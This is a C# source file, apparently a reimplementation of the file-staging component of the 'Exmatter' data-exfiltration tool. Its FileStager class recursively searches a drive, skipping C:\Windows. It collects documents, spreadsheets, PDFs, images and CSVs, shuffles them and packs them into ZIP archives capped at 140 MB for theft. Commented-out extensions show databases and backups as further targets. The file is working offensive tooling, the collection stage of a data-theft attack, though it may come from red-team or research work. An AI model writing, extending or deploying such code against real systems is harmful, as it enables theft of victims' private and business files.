using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;

namespace Exmatter
{
    public class FileStager
    {
        private static readonly List<string> TargetedFileExtensions = new List<string> {
            ".doc",
            ".docx",
            ".xls",
            ".xlsx",
            ".ppt",
            ".pptx",
            ".pdf",
            ".jpg",
            //".jpeg",
            ".png",
            //".bmp",
            //".zip",
            //".rar",
            //".mp3",
            //".mp4",
            //".avi",
            //".txt",
            ".csv",
            //".db",
            //".mdb",
            //".sql",
            //".bak"
        };

        private readonly string _rootDirectory;
        private readonly string _zipFilePath;

        public FileStager(string rootDirectory, string zipFilePath)
        {
            _rootDirectory = rootDirectory;
            _zipFilePath = zipFilePath;
        }

        public List<string> Go()
        {
            var filesToZip = new List<string>();

            // Recursively search for files with targeted extensions
            SearchForFiles(_rootDirectory, filesToZip);

            // Randomize the order of the files before creating the ZIP file
            var random = new Random();
            for (int i = filesToZip.Count - 1; i > 0; i--)
            {
                int j = random.Next(i + 1);
                string temp = filesToZip[i];
                filesToZip[i] = filesToZip[j];
                filesToZip[j] = temp;
            }

            // Create a ZIP file containing all of the files
            List<string> zipFiles = CreateZipFiles(filesToZip);

            return zipFiles;
            
        }

        private void SearchForFiles(string directory, List<string> filesToZip)
        {
            try
            {
                if (directory.Equals("C:\\Windows", StringComparison.OrdinalIgnoreCase))
                {
                    // Skip searching the C:\Windows directory
                    return;
                }

                foreach (string file in Directory.GetFiles(directory))
                {
                    if (TargetedFileExtensions.Contains(Path.GetExtension(file)))
                    {
                        filesToZip.Add(file);
                        //Console.WriteLine($"[+] Adding file \"{file}\"");
                    }
                }

                foreach (string subDirectory in Directory.GetDirectories(directory))
                {
                    SearchForFiles(subDirectory, filesToZip);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"[!] Error searching directory {directory}: {ex.Message}");
            }
        }

        private List<string> CreateZipFiles(List<string> filesToZip)
        {
            int maxZipFileSize = 140 * 1024 * 1024; // 140 MB in bytes
            int currentZipFileSize = 0;
            int zipFileCount = 1;
            string baseZipFilePath = _zipFilePath.Substring(0, _zipFilePath.LastIndexOf('.'));
            string zipFilePath = $"{baseZipFilePath}_{zipFileCount}.zip";
            var zipFilePaths = new List<string>();

            try
            {
                var zipArchive = ZipFile.Open(zipFilePath, ZipArchiveMode.Create);
                
                foreach (string file in filesToZip)
                {
                    // Check if the program has permissions to access the file
                    if (HasFileAccess(file))
                    {
                        var fileInfo = new FileInfo(file);
                        if (currentZipFileSize + fileInfo.Length > maxZipFileSize)
                        {
                            // Current zip file is too big, close it and start a new one
                            zipArchive.Dispose();
                            Console.WriteLine($"\n[+] ZIP file created: {zipFilePath}\n");
                            zipFilePaths.Add(zipFilePath);

                            zipFileCount++;
                            // Create new zip name
                            zipFilePath = $"{baseZipFilePath}_{zipFileCount}.zip";
                            // Start new archive from new name
                            zipArchive = ZipFile.Open(zipFilePath, ZipArchiveMode.Create);
                            currentZipFileSize = 0;
                        }

                        zipArchive.CreateEntryFromFile(file, Path.GetFileName(file));
                        Console.WriteLine($"[+] Adding file \"{file}\" to ZIP file");
                        currentZipFileSize += (int)fileInfo.Length;
                    }
                    else
                    {
                        Console.WriteLine($"[!] Program does not have permissions to access file \"{file}\"");
                    }
                }
                // Release last zip file
                zipArchive.Dispose();
                Console.WriteLine($"\n[+] ZIP file created: {zipFilePath}\n");
                Console.WriteLine($"[+] Total of {zipFileCount} zip files created\n");
                zipFilePaths.Add(zipFilePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error creating ZIP file: {ex.Message}");
            }

            return zipFilePaths;
        }



        private bool HasFileAccess(string filePath)
        {
            try
            {
                using (var stream = File.OpenRead(filePath))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}
